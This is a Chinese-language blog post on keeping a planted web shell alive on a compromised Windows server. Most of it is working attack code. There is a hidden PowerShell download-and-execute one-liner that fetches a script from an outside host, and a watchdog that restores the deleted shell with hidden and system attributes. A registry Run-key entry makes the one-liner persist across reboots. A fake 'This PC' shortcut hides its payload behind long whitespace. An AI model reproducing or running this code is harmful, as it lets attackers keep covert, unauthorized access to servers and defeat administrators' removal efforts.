如何优(wei)雅(suo)的维持住一个web shell？

大大大大前提：咱们已经有了一个web shell了，假定web shell的路径为G:\xampp\htdocs\backdoor\shell.php，读者自行测试时只需要修改ps1文件中这个路径即可。

猥琐0x01：

利用power shell来搞一搞事情，power shell具有“不落地”即可执行的便捷之处

powershell.exe -nop -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://ub3r.cn/tools/backd00r/Backd00r-webshell.ps1');Backd00r-webshell.ps1"
直接执行命令即可运行此ps1脚本，附上代码，如下：

$shell_path = "G:\xampp\htdocs\backdoor\shell.php"
$shell_content = [System.IO.File]::ReadAllBytes($shell_path)
while($true){
    $flag = Test-Path $shell_path
    if($flag -eq "True"){ sleep 1 }
    else{
        [System.IO.File]::WriteAllBytes($shell_path, $shell_content)
        $shell = Get-Item $shell_path
        $shell.Attributes = "Readonly","system","notcontentindexed","hidden","archive"
        sleep 1
    }
}
代码分析：$shell_path的路径是我们已经获取到的web shell的路径，代码很简单，首先ps1先获取web shell的文件内容，然后这个ps1脚本一直在静默检测web shell是否存在，如果脚本被删除则创建一个web shell文件，内容为脚本运行时获取的内容，并继续静默检测管理员是否将web shell删除。

别看这几行代码简短，里面可有彩蛋！请看下图：（GIF加载较慢，效果不爽请移步https://ub3r.cn/tools/backd00r/flag.mp4观看视频）

这个后门留的可舒服？当然仅限于win2k8以上才有power shell，才能用此方法。

猥琐0x02：

如果服务器重启或其他因素导致脚本停止运行，那不妨添加一个写注册表开机启动项的功能吧！

$autorunKeyName = "Windows Powershell"
$autorunKeyVal = "powershell.exe -nop -windowstyle hidden -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://ub3r.cn/tools/backd00r/Backd00r-webshell.ps1');Backd00r-webshell.ps1"""
$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
运行一下这个ps1文件就可以添加把命令添加进注册表中，下次开机时即可自动访问远程的ps1文件并执行，也可以把这段写注册表的代码直接加入到远程的ps1文件中，附文件地址https://ub3r.cn/tools/backd00r/Backd00r-webshell-Auto.ps1

猥琐0x03：

在Evi1cg师父那学习到一种更加猥琐的方法，如图示：
backd00r

如此一来，把”此电脑”快捷方式绑定上执行power shell代码就没毛病了吧！附上代码：

Function LNK_backdoor{
    $Command = "powershell.exe -nop -windowstyle hidden -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://ub3r.cn/tools/backd00r/Backd00r-webshell.ps1');Backd00r-webshell.ps1"""
    ##HIDE Computer Icon
    $ErrorActionPreference = "SilentlyContinue"
    If ($Error) {$Error.Clear()}
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    If (Test-Path $RegistryPath) {
        $Res = Get-ItemProperty -Path $RegistryPath -Name "HideIcons"
        If (-Not($Res)) {
            New-ItemProperty -Path $RegistryPath -Name "HideIcons" -Value "0" -PropertyType DWORD -Force | Out-Null
        }
        $Check = (Get-ItemProperty -Path $RegistryPath -Name "HideIcons").HideIcons
        If ($Check -NE 0) {
            New-ItemProperty -Path $RegistryPath -Name "HideIcons" -Value "0" -PropertyType DWORD -Force | Out-Null
        }
    }
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons"
    If (-Not(Test-Path $RegistryPath)) {
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "HideDesktopIcons" -Force | Out-Null
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons" -Name "NewStartPanel" -Force | Out-Null
    }
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
    If (-Not(Test-Path $RegistryPath)) {
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons" -Name "NewStartPanel" -Force | Out-Null
    }
    If (Test-Path $RegistryPath) {
    ## -- My Computer
        $Res = Get-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        If (-Not($Res)) {
            New-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value "1" -PropertyType DWORD -Force | Out-Null
        }
        $Check = (Get-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}")."{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        If ($Check -NE 1) {
            New-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value "1" -PropertyType DWORD -Force | Out-Null
        }
    }
    If ($Error) {$Error.Clear()}
    ##SHOW Computer Icon
    #set-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu' -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value 0
    #set-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel' -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value 0
    #RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
    $Commandline = "/c explorer.exe /e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D} | "
    $Command = $Commandline + $Command
    $get_path=New-Object -ComObject WScript.Shell; 
    $path = $get_path.SpecialFolders.Item('Desktop')
    $WshShell = New-Object -comObject WScript.Shell
    $My_Computer = 17
    $Shell = new-object -comobject shell.application
    $NSComputer = $Shell.Namespace($My_Computer)
    $name = $NSComputer.self.name
    $Shortcut = $WshShell.CreateShortcut($path+"\"+$name+".lnk")
    $Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
    $Shortcut.WindowStyle = 7
    $Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,15"
    $Shortcut.Arguments = '                                                                                                                                                                                                                                      '+ $Command
    $Shortcut.Save()
    refresh
}
Function refresh{
   $source = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
namespace FileEncryptProject.Algorithm
{
  public class DesktopRefurbish
  {
    [DllImport("shell32.dll")]
    public static extern void SHChangeNotify(HChangeNotifyEventID wEventId, HChangeNotifyFlags uFlags, IntPtr dwItem1, IntPtr dwItem2);
    public static void DeskRef()
    {
      SHChangeNotify(HChangeNotifyEventID.SHCNE_ASSOCCHANGED, HChangeNotifyFlags.SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
    }
  }
  #region public enum HChangeNotifyFlags
  [Flags]
  public enum HChangeNotifyFlags
  {
    SHCNF_DWORD = 0x0003,
    SHCNF_IDLIST = 0x0000,
    SHCNF_PATHA = 0x0001,
    SHCNF_PATHW = 0x0005,
    SHCNF_PRINTERA = 0x0002,
    SHCNF_PRINTERW = 0x0006,
    SHCNF_FLUSH = 0x1000,
    SHCNF_FLUSHNOWAIT = 0x2000
  }
  #endregion//enum HChangeNotifyFlags
  #region enum HChangeNotifyEventID
  [Flags]
  public enum HChangeNotifyEventID
  {
    SHCNE_ALLEVENTS = 0x7FFFFFFF,
    SHCNE_ASSOCCHANGED = 0x08000000,
    SHCNE_ATTRIBUTES = 0x00000800,
    SHCNE_CREATE = 0x00000002,
    SHCNE_DELETE = 0x00000004,
    SHCNE_DRIVEADD = 0x00000100,
    SHCNE_DRIVEADDGUI = 0x00010000,
    SHCNE_DRIVEREMOVED = 0x00000080,
    SHCNE_EXTENDED_EVENT = 0x04000000,
    SHCNE_FREESPACE = 0x00040000,
    SHCNE_MEDIAINSERTED = 0x00000020,
    SHCNE_MEDIAREMOVED = 0x00000040,
    SHCNE_MKDIR = 0x00000008,
    SHCNE_NETSHARE = 0x00000200,
    SHCNE_NETUNSHARE = 0x00000400,
    SHCNE_RENAMEFOLDER = 0x00020000,
    SHCNE_RENAMEITEM = 0x00000001,
    SHCNE_RMDIR = 0x00000010,
    SHCNE_SERVERDISCONNECT = 0x00004000,
    SHCNE_UPDATEDIR = 0x00001000,
    SHCNE_UPDATEIMAGE = 0x00008000,
  }
  #endregion
}
"@
     Add-Type -TypeDefinition $source
    [FileEncryptProject.Algorithm.DesktopRefurbish]::DeskRef()
}
LNK_backdoor
$Command是修改命令的地方，更多优雅的套路就看各位老哥继续挖掘了！

结尾0X04：

仅仅分享笔者的一点想法，如有问题希望请直接在下方评论或联系微信即可~

We Chat : z1002968501
